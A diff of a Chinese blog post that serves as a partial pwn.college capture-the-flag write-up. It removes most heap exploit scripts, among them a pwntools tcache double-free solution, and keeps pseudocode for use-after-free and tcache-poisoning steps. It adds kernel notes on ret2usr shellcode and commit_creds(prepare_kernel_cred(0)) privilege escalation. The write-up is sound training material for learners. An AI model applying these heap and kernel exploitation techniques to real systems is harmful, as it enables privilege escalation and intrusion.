@@ -22,21 +22,21 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"junyu33.me","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
-<meta name="description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges">
+<meta name="description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges  按照网站要求，这里只提供思路和第一题的exploit。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwncollege部分通关记录">
-<meta property="og:url" content="https://junyu33.me/2022/07/03/pwn_college.html">
+<meta property="og:title" content="（置顶）pwncollege部分通关记录">
+<meta property="og:url" content="https://junyu33.me/2032/07/03/pwn_college.html">
 <meta property="og:site_name" content="现充|junyu33">
-<meta property="og:description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges">
+<meta property="og:description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges  按照网站要求，这里只提供思路和第一题的exploit。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-07-03T10:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-31T02:33:54.832Z">
+<meta property="article:published_time" content="2032-07-03T10:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-21T15:55:31.522Z">
 <meta property="article:author" content="丨junyu33丨">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://junyu33.me/2022/07/03/pwn_college.html">
+<link rel="canonical" href="https://junyu33.me/2032/07/03/pwn_college.html">
 
 
 <script class="page-configurations">
@@ -48,7 +48,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>pwncollege部分通关记录 | 现充|junyu33</title>
+<title>（置顶）pwncollege部分通关记录 | 现充|junyu33</title>
   
 
 
@@ -208,7 +208,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#heap"><span class="nav-number">1.</span> <span class="nav-text">heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap1-0-2-1%E2%80%94%E2%80%94uaf"><span class="nav-number">1.1.</span> <span class="nav-text">babyheap1.0~2.1——uaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap3-0-3-1%E2%80%94%E2%80%94uaf2-0"><span class="nav-number">1.2.</span> <span class="nav-text">babyheap3.0~3.1——uaf2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap4-0-amp-4-1%E2%80%94%E2%80%94tcache-double-free"><span class="nav-number">1.3.</span> <span class="nav-text">babyheap4.0&amp;4.1——tcache double free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap5-0-amp-5-1%E2%80%94%E2%80%94unsorted-bin-attack"><span class="nav-number">1.4.</span> <span class="nav-text">babyheap5.0&amp;5.1——unsorted bin attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap6-0-amp-6-1%E2%80%94%E2%80%94tcache-poisoning"><span class="nav-number">1.5.</span> <span class="nav-text">babyheap6.0&amp;6.1——tcache poisoning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap7-0-amp-7-1%E2%80%94%E2%80%94tcache-poisoning2-0"><span class="nav-number">1.6.</span> <span class="nav-text">babyheap7.0&amp;7.1——tcache poisoning2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap8-0-amp-8-1%E2%80%94%E2%80%94brute-force"><span class="nav-number">1.7.</span> <span class="nav-text">babyheap8.0&amp;8.1——brute force</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel"><span class="nav-number">2.</span> <span class="nav-text">kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babykernel1-0-6-1"><span class="nav-number">2.1.</span> <span class="nav-text">babykernel1.0~6.1</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#heap"><span class="nav-number">1.</span> <span class="nav-text">heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap1-0-2-1%E2%80%94%E2%80%94uaf"><span class="nav-number">1.1.</span> <span class="nav-text">babyheap1.0~2.1——uaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap3-0-3-1%E2%80%94%E2%80%94uaf2-0"><span class="nav-number">1.2.</span> <span class="nav-text">babyheap3.0~3.1——uaf2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap4-0-amp-4-1%E2%80%94%E2%80%94tcache-double-free"><span class="nav-number">1.3.</span> <span class="nav-text">babyheap4.0&amp;4.1——tcache double free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap5-0-amp-5-1%E2%80%94%E2%80%94unsorted-bin-attack"><span class="nav-number">1.4.</span> <span class="nav-text">babyheap5.0&amp;5.1——unsorted bin attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap6-0-amp-6-1%E2%80%94%E2%80%94tcache-poisoning"><span class="nav-number">1.5.</span> <span class="nav-text">babyheap6.0&amp;6.1——tcache poisoning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap7-0-amp-7-1%E2%80%94%E2%80%94tcache-poisoning2-0"><span class="nav-number">1.6.</span> <span class="nav-text">babyheap7.0&amp;7.1——tcache poisoning2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap8-0-amp-8-1%E2%80%94%E2%80%94brute-force"><span class="nav-number">1.7.</span> <span class="nav-text">babyheap8.0&amp;8.1——brute force</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel"><span class="nav-number">2.</span> <span class="nav-text">kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babykernel1-0-6-1"><span class="nav-number">2.1.</span> <span class="nav-text">babykernel1.0~6.1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babykernel7-0-7-1"><span class="nav-number">2.2.</span> <span class="nav-text">babykernel7.0~7.1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babykernel8-0-8-1"><span class="nav-number">2.3.</span> <span class="nav-text">babykernel8.0~8.1</span></a></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -224,7 +224,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">54</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -326,7 +326,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2022/07/03/pwn_college.html">
+    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2032/07/03/pwn_college.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -339,7 +339,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwncollege部分通关记录
+          （置顶）pwncollege部分通关记录
         </h1>
 
         <div class="post-meta-container">
@@ -350,14 +350,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-07-03 18:00:00" itemprop="dateCreated datePublished" datetime="2022-07-03T18:00:00+08:00">2022-07-03</time>
+      <time title="创建时间：2032-07-03 18:00:00" itemprop="dateCreated datePublished" datetime="2032-07-03T18:00:00+08:00">2032-07-03</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-10-31 10:33:54" itemprop="dateModified" datetime="2022-10-31T10:33:54+08:00">2022-10-31</time>
+        <time title="修改时间：2022-11-21 23:55:31" itemprop="dateModified" datetime="2022-11-21T23:55:31+08:00">2022-11-21</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -377,14 +377,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.6k</span>
+      <span>1.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -396,23 +396,17 @@
     
     <div class="post-body" itemprop="articleBody">
         <p>指 <a target="_blank" rel="noopener" href="https://dojo.pwn.college/challenges">https://dojo.pwn.college/challenges</a> </p>
+<p>按照网站要求，这里只提供思路和第一题的exploit。</p>
 <span id="more"></span>
 <h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="babyheap1-0-2-1——uaf"><a href="#babyheap1-0-2-1——uaf" class="headerlink" title="babyheap1.0~2.1——uaf"></a>babyheap1.0~2.1——uaf</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(flag_size)</span><br><span class="line">   free()</span><br><span class="line">   read_flag()</span><br><span class="line">   puts()</span><br></pre></td></tr></table></figure>
 <h2 id="babyheap3-0-3-1——uaf2-0"><a href="#babyheap3-0-3-1——uaf2-0" class="headerlink" title="babyheap3.0~3.1——uaf2.0"></a>babyheap3.0~3.1——uaf2.0</h2><p>注意tcache是LIFO结构</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   read_flag()</span><br><span class="line">   puts(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="babyheap4-0-amp-4-1——tcache-double-free"><a href="#babyheap4-0-amp-4-1——tcache-double-free" class="headerlink" title="babyheap4.0&amp;4.1——tcache double free"></a>babyheap4.0&amp;4.1——tcache double free</h2><p>第一次独立写出堆题，虽然是最简单的那种<code>tcache double free</code>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;/challenge/babyheap_level4.1&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;Function (malloc/free/puts/scanf/read_flag/quit): &#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;439&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="comment"># get the pointer of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># get the location of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer again, make flag allocate here</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;read_flag&#x27;</span>)</span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap5-0-amp-5-1——unsorted-bin-attack"><a href="#babyheap5-0-amp-5-1——unsorted-bin-attack" class="headerlink" title="babyheap5.0&amp;5.1——unsorted bin attack"></a>babyheap5.0&amp;5.1——unsorted bin attack</h2><p>先考虑没有tcache的情况：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">2</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   read_flag()</span><br><span class="line"></span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
-<p>libc 2.23-&gt;libc 2.31</p>
+<h2 id="babyheap5-0-amp-5-1——unsorted-bin-attack"><a href="#babyheap5-0-amp-5-1——unsorted-bin-attack" class="headerlink" title="babyheap5.0&amp;5.1——unsorted bin attack"></a>babyheap5.0&amp;5.1——unsorted bin attack</h2><p>libc 2.23-&gt;libc 2.31</p>
 <p>通过耗尽所有的tcache来触发small bin和unsorted bin，进而修改chunk。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      free(i)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line"></span><br><span class="line">   read_flag()</span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">7</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">8</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
 <h2 id="babyheap6-0-amp-6-1——tcache-poisoning"><a href="#babyheap6-0-amp-6-1——tcache-poisoning" class="headerlink" title="babyheap6.0&amp;6.1——tcache poisoning"></a>babyheap6.0&amp;6.1——tcache poisoning</h2><p>简单的tcache poisoning</p>
 <p><a target="_blank" rel="noopener" href="https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31">https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   scanf(<span class="number">1</span>, p64(sec_addr))</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   puts(<span class="number">1</span>)</span><br><span class="line">   p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">   send_flag(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
 <h2 id="babyheap7-0-amp-7-1——tcache-poisoning2-0"><a href="#babyheap7-0-amp-7-1——tcache-poisoning2-0" class="headerlink" title="babyheap7.0&amp;7.1——tcache poisoning2.0"></a>babyheap7.0&amp;7.1——tcache poisoning2.0</h2><p>由于flag不会变化，secret后半部分，只需将sec_addr+=8，重新运行即可。</p>
 <h2 id="babyheap8-0-amp-8-1——brute-force"><a href="#babyheap8-0-amp-8-1——brute-force" class="headerlink" title="babyheap8.0&amp;8.1——brute force"></a>babyheap8.0&amp;8.1——brute force</h2><p>通过先前的方法可以泄露出secret的后12位，前4位可以通过暴力枚举实现。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">         <span class="keyword">for</span> k <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">               payload = i+j+k+l+<span class="string">&#x27;tlymdcflfbsk&#x27;</span></span><br><span class="line">               send_flag(payload)</span><br><span class="line">               p.recvline()</span><br><span class="line">               <span class="keyword">if</span> <span class="string">b&#x27;Authorized!&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">                  <span class="keyword">return</span></span><br><span class="line">               p.recvline()</span><br></pre></td></tr></table></figure>
 <p>脚本跑了一节课才跑出来。</p>
 <h1 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h1><h2 id="babykernel1-0-6-1"><a href="#babykernel1-0-6-1" class="headerlink" title="babykernel1.0~6.1"></a>babykernel1.0~6.1</h2><p>参照这篇博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/crybaby/p/14431651.html">https://www.cnblogs.com/crybaby/p/14431651.html</a></p>
 <p>kernel shellcode着实有点麻人。</p>
@@ -420,6 +414,15 @@
 <p>注：如何查看有没有kaslr？</p>
 <p>进入kernel后，<code>demsg</code>查看第二行最后有没有<code>nokaslr</code></p>
 </blockquote>
+<h2 id="babykernel7-0-7-1"><a href="#babykernel7-0-7-1" class="headerlink" title="babykernel7.0~7.1"></a>babykernel7.0~7.1</h2><p>需要传入一个类似于这样的结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shellcode</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> length;</span><br><span class="line">    <span class="type">char</span> shellcode[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* shellcode_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意以下几点：</p>
+<ul>
+<li>shellcode必须包含ret语句（ret2usr）。</li>
+<li>shellcode_addr可以通过动调得到，位置固定。</li>
+</ul>
+<h2 id="babykernel8-0-8-1"><a href="#babykernel8-0-8-1" class="headerlink" title="babykernel8.0~8.1"></a>babykernel8.0~8.1</h2><p>一句话——在shellcode里写shellcode</p>
+<p>第一次进内核来一遍<code>commit_creds(prepare_kernel_cred(0))</code>，<code>ret2usr</code>后变成root shell。再进入一次<code>run_cmd chmod 777 /flag</code>即可修改flag权限。（注意在内核态里起shell没有任何作用）</p>
 
     </div>
 
@@ -437,7 +440,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://junyu33.me/2022/07/03/pwn_college.html" title="pwncollege部分通关记录">https://junyu33.me/2022/07/03/pwn_college.html</a>
+      <a href="https://junyu33.me/2032/07/03/pwn_college.html" title="（置顶）pwncollege部分通关记录">https://junyu33.me/2032/07/03/pwn_college.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -453,13 +456,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/06/24/cxxxt.html" rel="prev" title="（转载）我家跨上了“信息高速路”">
-                  <i class="fa fa-chevron-left"></i> （转载）我家跨上了“信息高速路”
+                <a href="/2022/11/21/unctf2022.html" rel="prev" title="unctf2022pwn wp">
+                  <i class="fa fa-chevron-left"></i> unctf2022pwn wp
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/07/06/anniversary.html" rel="next" title="博客一周年祭">
-                  博客一周年祭 <i class="fa fa-chevron-right"></i>
+                <a href="/2038/01/19/%E7%A2%8E%E7%A2%8E%E5%BF%B5.html" rel="next" title="（置顶）碎碎念">
+                  （置顶）碎碎念 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -515,13 +518,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">344k</span>
+    <span title="站点总字数">348k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:13</span>
+    <span title="站点阅读时长">5:16</span>
   </span>
 </div>
 <div class="busuanzi-count">
